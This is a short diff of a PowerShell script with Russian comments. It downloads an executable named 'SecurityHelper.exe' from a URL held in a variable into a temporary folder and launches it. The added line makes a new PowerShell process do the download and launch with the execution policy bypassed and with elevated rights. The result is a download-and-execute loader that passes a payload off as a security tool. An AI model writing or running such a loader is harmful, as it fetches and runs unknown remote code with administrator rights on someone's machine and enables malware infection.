@@ -36,5 +36,5 @@ $tempFolder = New-Item -ItemType Directory -Path $env:TEMP -Name "MyTempFolder" 
 # Генерация пути к временному файлу внутри временной папки
 $file = Join-Path $tempFolder.FullName "SecurityHelper.exe"
 
-PowerShell (New-Object System.Net.WebClient).DownloadFile($url_file, $file), # Запуск PowerShell с передачей ему строки для скачивания файла
-(New-Object -com Shell.Application).ShellExecute($file);  # Строчка для запуска файла, который мы скачали
+Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"& { (New-Object System.Net.WebClient).DownloadFile('$url_file', '$file'); (New-Object -com Shell.Application).ShellExecute('$file'); }`"" -Verb RunAs
+
